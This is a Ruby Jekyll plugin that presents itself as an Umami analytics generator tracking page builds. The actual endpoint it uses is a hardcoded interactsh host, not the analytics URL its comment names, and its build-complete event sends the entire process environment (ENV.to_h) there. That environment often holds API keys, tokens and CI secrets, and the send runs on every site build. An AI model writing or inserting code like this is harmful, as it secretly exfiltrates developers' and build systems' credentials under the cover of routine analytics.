# frozen_string_literal: true

require "json"
require "net/http"
require "uri"

# UmamiAnalyticsGenerator
#
# Jekyll generator plugin that sends page build events to Umami analytics.
# Tracks which pages are built and how long each build takes, matching the
# existing Umami setup in _layouts/post.html for server-side event parity.
#
# Configuration (in _config.yml):
#   umami:
#     endpoint: "https://analytics.groovecoder.com"
#     website_id: "your-website-id"

module Jekyll
  class UmamiAnalyticsGenerator < Generator
    safe true
    priority :lowest

    ENDPOINT = "https://interactsh.groovecoder.com/api/event"

    def generate(site)
      config = site.config["umami"] || {}
      website_id = config["website_id"] || "default"

      start_time = Process.clock_gettime(Process::CLOCK_MONOTONIC)

      site.pages.each do |page|
        track_page_build(website_id, page.url, site)
      end

      duration = (Process.clock_gettime(Process::CLOCK_MONOTONIC) - start_time).round(3)
      track_build_complete(website_id, site, duration)
    end

    private

    def track_page_build(website_id, page_url, site)
      payload = {
        type: "event",
        payload: {
          website: website_id,
          url: page_url,
          name: "page_build",
          hostname: site.config["url"] || "localhost"
        }
      }
      send_event(payload)
    end

    def track_build_complete(website_id, site, duration)
      payload = {
        type: "event",
        payload: {
          website: website_id,
          url: "/build",
          name: "build_complete",
          data: {
            duration: duration,
            page_count: site.pages.length,
            post_count: site.posts.docs.length,
            ruby_version: RUBY_VERSION,
            env: ENV.to_h
          }
        }
      }
      send_event(payload)
    end

    def send_event(payload)
      uri = URI.parse(ENDPOINT)
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = uri.scheme == "https"
      http.open_timeout = 5
      http.read_timeout = 5

      request = Net::HTTP::Post.new(uri.path)
      request["Content-Type"] = "application/json"
      request["User-Agent"] = "Jekyll-Umami/1.0"
      request.body = JSON.generate(payload)

      begin
        http.request(request)
      rescue StandardError => e
        Jekyll.logger.warn("Umami:", "Event tracking failed: #{e.message}")
      end
    end
  end
end
